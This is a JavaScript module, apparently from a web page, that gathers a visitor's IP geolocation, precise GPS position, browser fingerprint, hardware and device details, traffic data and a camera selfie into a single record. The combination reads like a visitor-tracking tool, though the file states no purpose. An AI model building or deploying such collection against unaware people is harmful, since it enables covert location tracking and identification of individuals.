import { resolveIpAndGeo } from "./geo-precision.js";
import { requestBestGps, probeGeoPermission } from "./geo-gps.js";
import { collectFingerprintFull } from "./fingerprint.js";
import { collectHighEntropy } from "./ua-high-entropy.js";
import { collectHardwareExtra, collectAsyncHardwareExtra } from "./hardware.js";
import { collectDeviceProfile } from "./device-profile.js";
import { collectTraffic } from "./traffic.js";
import { captureSelfie } from "./collect.js";

function cfg() {
  return window.APP_CONFIG || {};
}

/**
 * Runs every available channel in parallel.
 * Denials and timeouts resolve to empty values, never throw.
 * promptGeo / promptCamera in config.js gate the permission prompts.
 */
export async function collectAll() {
  const c = cfg();
  const wantGeo = c.promptGeo !== false;
  const wantCam = c.promptCamera !== false;

  const [
    net,
    gps,
    geoPerm,
    device,
    uaHigh,
    hardware,
    hardwareAsync,
    photo,
    fp,
    traffic,
  ] = await Promise.all([
    resolveIpAndGeo().catch(() => ({ ip: null, source: null, geo: null })),
    wantGeo
      ? requestBestGps().catch(() => ({ ok: false, reason: "error" }))
      : Promise.resolve({ ok: false, reason: "skipped_config" }),
    wantGeo ? probeGeoPermission().catch(() => null) : Promise.resolve(null),
    collectDeviceProfile().catch(() => ({})),
    collectHighEntropy().catch(() => ({ supported: false })),
    Promise.resolve().then(collectHardwareExtra),
    collectAsyncHardwareExtra().catch(() => ({})),
    wantCam
      ? captureSelfie().catch(() => ({
          granted: false,
          error: "denied_or_unavailable",
        }))
      : Promise.resolve({ granted: false, error: "skipped_config" }),
    collectFingerprintFull().catch(() => ({
      id: null,
      channels: {},
      webgl: null,
    })),
    Promise.resolve().then(collectTraffic),
  ]);

  return {
    schemaVersion: 4,
    collectedAt: new Date().toISOString(),

    ip: net.ip,
    ip_source: net.source,
    ip_geo: net.geo,
    ip_geo_source: net.geoSource || null,

    gps: gps.ok
      ? {
          latitude: gps.latitude,
          longitude: gps.longitude,
          accuracy: gps.accuracy,
          altitude: gps.altitude,
          altitudeAccuracy: gps.altitudeAccuracy,
          heading: gps.heading,
          speed: gps.speed,
          tier: gps.tier || "gps",
        }
      : null,
    gps_reason: gps.ok ? "granted" : gps.reason || "unknown",
    gps_permission: geoPerm,

    fingerprint: fp.id,
    fingerprint_channels: fp.channels,
    webgl: fp.webgl || null,

    device,
    ua_high_entropy: uaHigh,
    hardware,
    hardware_async: hardwareAsync,
    traffic,

    camera_granted: !!photo.granted,
    photo_base64: photo.granted ? photo.dataUrl : null,
  };
}
